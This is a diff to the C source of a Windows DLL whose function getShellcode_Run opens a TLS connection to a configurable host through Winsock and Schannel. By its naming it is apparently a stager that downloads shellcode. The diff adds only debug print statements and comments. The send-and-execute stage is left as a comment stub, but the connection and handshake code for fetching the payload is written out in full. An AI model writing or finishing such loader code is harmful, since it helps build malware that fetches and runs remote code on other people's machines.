@@ -11,6 +11,7 @@
 
 #define DEFAULT_BUFLEN 4096
 
+// Target details
 char ip[] = "www.google.com";
 char port[] = "443";
 char resource[] = "";
@@ -58,12 +59,15 @@ void getShellcode_Run(char* host, char* port, char* resource) {
         "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36\r\n"
         "\r\n",
         resource, host);
+    printf("HTTP Request Built:\n%s\n", sendbuf);
 
     // Initialize Winsock
+    printf("Initializing Winsock...\n");
     if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
         printf("WSAStartup failed\n");
         return;
     }
+    printf("Winsock initialized successfully\n");
 
     ZeroMemory(&hints, sizeof(hints));
     hints.ai_family = AF_INET;
@@ -71,16 +75,19 @@ void getShellcode_Run(char* host, char* port, char* resource) {
     hints.ai_protocol = IPPROTO_TCP;
 
     // Resolve hostname
+    printf("Resolving hostname: %s...\n", host);
     if (getaddrinfo(host, port, &hints, &result) != 0) {
         printf("getaddrinfo failed\n");
         WSACleanup();
         return;
     }
+    printf("Hostname resolved successfully\n");
 
     for (ptr = result; ptr != NULL; ptr = ptr->ai_next) {
         ConnectSocket = socket(ptr->ai_family, ptr->ai_socktype, ptr->ai_protocol);
         if (ConnectSocket == INVALID_SOCKET) continue;
 
+        printf("Attempting to connect...\n");
         if (connect(ConnectSocket, ptr->ai_addr, (int)ptr->ai_addrlen) == SOCKET_ERROR) {
             closesocket(ConnectSocket);
             ConnectSocket = INVALID_SOCKET;
@@ -95,8 +102,10 @@ void getShellcode_Run(char* host, char* port, char* resource) {
         WSACleanup();
         return;
     }
+    printf("Connected to server successfully\n");
 
     // Initialize SSL
+    printf("Initializing SSL...\n");
     SCHANNEL_CRED schannelCred = { 0 };
     schannelCred.dwVersion = SCHANNEL_CRED_VERSION;
     schannelCred.grbitEnabledProtocols = SP_PROT_TLS1_2_CLIENT | SP_PROT_TLS1_3_CLIENT;
@@ -109,6 +118,7 @@ void getShellcode_Run(char* host, char* port, char* resource) {
         WSACleanup();
         return;
     }
+    printf("Credentials handle acquired successfully\n");
 
     SecBufferDesc outBuffer, inBuffer;
     SecBuffer outBuffers[1], inBuffers[2];
@@ -122,16 +132,19 @@ void getShellcode_Run(char* host, char* port, char* resource) {
     outBuffer.pBuffers = outBuffers;
     outBuffer.ulVersion = SECBUFFER_VERSION;
 
+    printf("Starting SSL handshake...\n");
     secStatus = InitializeSecurityContextA(&hCred, NULL, host, dwFlags, 0, 0, NULL, 0, &hContext, &outBuffer, &dwFlags, NULL);
     if (secStatus != SEC_I_CONTINUE_NEEDED) {
         printf("InitializeSecurityContext failed: 0x%08X\n", secStatus);
         cleanup(&ConnectSocket, &hCred, &hContext, encryptedBuf);
         return;
     }
+    printf("SSL handshake initiated successfully\n");
 
     send(ConnectSocket, (char*)outBuffers[0].pvBuffer, outBuffers[0].cbBuffer, 0);
     FreeContextBuffer(outBuffers[0].pvBuffer);
 
+    // SSL Handshake Loop
     bool handshakeComplete = false;
     while (!handshakeComplete) {
         int bytesReceived = recv(ConnectSocket, sslBuf + sslBufLen, sizeof(sslBuf) - sslBufLen, 0);
@@ -142,6 +155,7 @@ void getShellcode_Run(char* host, char* port, char* resource) {
         }
 
         sslBufLen += bytesReceived;
+        printf("Received %d bytes during handshake\n", bytesReceived);
 
         inBuffers[0].pvBuffer = sslBuf;
         inBuffers[0].cbBuffer = sslBufLen;
@@ -157,8 +171,10 @@ void getShellcode_Run(char* host, char* port, char* resource) {
 
         secStatus = InitializeSecurityContextA(&hCred, &hContext, NULL, dwFlags, 0, 0, &inBuffer, 0, NULL, &outBuffer, &dwFlags, NULL);
         if (secStatus == SEC_E_OK) {
+            printf("SSL handshake completed successfully\n");
             handshakeComplete = true;
         } else if (secStatus == SEC_I_CONTINUE_NEEDED) {
+            printf("Continuing SSL handshake...\n");
             send(ConnectSocket, (char*)outBuffers[0].pvBuffer, outBuffers[0].cbBuffer, 0);
             FreeContextBuffer(outBuffers[0].pvBuffer);
         } else {
@@ -169,9 +185,11 @@ void getShellcode_Run(char* host, char* port, char* resource) {
     }
 
     // After the handshake, send the HTTP request
+    printf("Encrypting and sending HTTP request...\n");
     // Encrypt and send the request, then handle the response similarly to how we handle handshake records.
 
     cleanup(&ConnectSocket, &hCred, &hContext, encryptedBuf);
+    printf("Cleaned up resources\n");
 }
 
 BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved) {
